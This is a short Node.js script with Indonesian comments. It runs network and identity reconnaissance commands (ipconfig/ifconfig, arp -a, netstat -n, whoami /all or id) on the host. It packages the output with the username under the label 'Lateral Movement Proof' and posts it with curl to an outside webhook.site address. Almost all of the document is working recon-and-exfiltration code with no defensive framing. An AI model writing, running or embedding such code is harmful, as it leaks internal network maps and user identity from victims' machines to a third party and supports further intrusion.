const { exec } = require('child_process');
const webhook = 'https://webhook.site/8a38ce89-81b6-4ef4-91fa-90d2044ac7a7';

// Perintah untuk memetakan jaringan internal dan identitas sistem
const cmd = 'echo ---IP_CONFIG--- && ipconfig /all || ifconfig && echo ---ARP_TABLE--- && arp -a && echo ---NETSTAT--- && netstat -n && echo ---USER_INFO--- && whoami /all || id';

exec(cmd, (error, stdout, stderr) => {
    const payload = JSON.stringify({
        origin: "Lateral Movement Proof",
        status: "RECON_SUCCESS",
        evidence: stdout,
        env_user: process.env.USERNAME || process.env.USER || 'Justin',
        timestamp: new Date().toISOString()
    });
    
    // Pembersihan payload agar aman dikirim lewat curl
    const safePayload = payload.replace(/'/g, "");
    exec(`curl -X POST -H "Content-Type: application/json" -d '${safePayload}' ${webhook}`);
});
